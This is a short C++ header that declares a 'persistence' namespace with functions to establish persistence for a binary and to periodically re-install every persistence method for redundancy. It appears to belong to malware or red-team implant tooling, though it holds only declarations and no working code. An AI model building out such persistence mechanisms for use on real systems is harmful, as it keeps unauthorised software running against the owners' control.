#pragma once
#include <string>

namespace persistence {

// Establishes persistence.
// Returns the path of the persisted binary if successful.
std::string establishPersistence(const std::string& overrideSourcePath = "");

// Periodically re-installs all persistence methods to ensure redundancy.
void ReinstallPersistence();

} // namespace persistence
